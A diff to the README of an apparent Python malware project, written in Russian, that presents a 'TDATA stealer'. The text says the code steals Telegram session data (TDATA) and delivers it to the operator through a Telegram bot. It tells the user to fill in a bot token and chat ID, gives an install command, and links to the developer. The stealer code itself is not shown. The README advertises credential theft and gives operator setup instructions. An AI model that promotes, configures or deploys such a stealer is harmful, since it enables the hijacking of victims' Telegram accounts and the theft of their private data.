@@ -1,2 +1,12 @@
 # TDATA_STEALER_PYTHON
-stealertdatapython
+Стиллер TDATA на python
+Данный код крадет TDATA и отправляет вам в личные сообщения бота
+
+Перед использованием стоит заполнить поля 
+<code>TOKENBOT</code> и
+<code>ID</code>
+
+Установка:
+<code>pip install -r requrments.txt</code>
+
+Разработчика этой дрестни можно найти https://linktr.ee/egorkapomidorka
